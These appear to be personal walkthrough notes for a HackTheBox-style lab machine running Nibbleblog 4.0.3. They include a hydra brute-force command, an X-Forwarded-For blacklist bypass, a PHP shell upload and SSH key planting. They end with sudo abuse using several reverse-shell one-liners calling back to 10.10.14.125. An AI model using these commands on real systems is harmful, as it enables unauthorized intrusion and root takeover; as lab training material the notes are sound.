Doing some initial recon we see that there is a directory /nibbleblog/ from html comments
from there start enumeration and also find that there are some exploits with nibbleblog

http://10.129.223.180/nibbleblog/update.php -> shows us the version we are working with
- Nibbleblog 4.0.3 "Coffee"
- Which is an arbitrary file upload

/admin lets you view the directory (uploader (copy) .php (copy) ???)

/nibbleblog/content/private/users.xml
- username is admin

https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/
sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"
sudo hydra -l admin -P ./../../../tools/lists/rockyou.txt 10.129.237.80 http-post-form "/nibbleblog/admin.php:username=admin&password=^PASS^:security error"

we get blacklisted...so need to find a way out of it
http://10.129.237.80/nibbleblog/admin/boot/rules/4-blacklist.bit????

blacklisted, look for ways to get around it, maybe spoof request headers or something
if its on htb chances are there is a way to bypass

taking a look into ways they could be blacklisting us other than IP address (prob cant spoof that on htb vpn)
maybe we can spoof client headers:
 - https://security.stackexchange.com/questions/8721/benefits-of-identifying-clients-based-upon-the-x-forwarded-for-or-similar-http
looking at the first one we can do `X-Forwarded-For: 127.0.0.1`
That actually works!
- Now maybe there is a way to do this with hydra??

admin:nibbles works, so try the challenge name for both username and password
look at blogs to potentially find a faster way around things????

this blog made it pretty easy without having to really code anything
https://wikihak.com/how-to-upload-a-shell-in-nibbleblog-4-0-3/

upploaded a php shell

saw that it was using ssh, so tried a cheecky thing and uploaded my pub key to the server to try and ssh into it
`mkdir ~/.ssh`
`echo "[pub_key]" > ~/.ssh/authorized_keys`
`ssh -i .ssh/id_ed25519 nibbler@10.129.244.45`

got ssh access!
from there we unzip personal.zip, we go ahead and unzip it and get monitor.sh

taking a side look, we run `sudo -l` and we see that `(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh`

maybe there is a password somewhere else??
tried to download and run linpeas but no permission for that

NOTE: Always look at the NOPASSWD when sudo -l
`echo "/bin/sh -i >& /dev/tcp/10.10.14.125/6000 0>&1" > monitor.sh`
`echo "nc -e /bin/sh 10.10.14.125 6000" > monitor.sh`
`echo "/bin/bash -l > /dev/tcp/10.10.14.125/6000 0<&1 2>&1" > monitor.sh`
`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.125 6000 >/tmp/f" > monitor.sh`

Ran through a bunch of reverse shell commands till I got something to work (last one)
then executed the script with sudo
`sudo /home/nibbler/personal/stuff/monitor.sh`

setup the reverse shell listener, and you got it!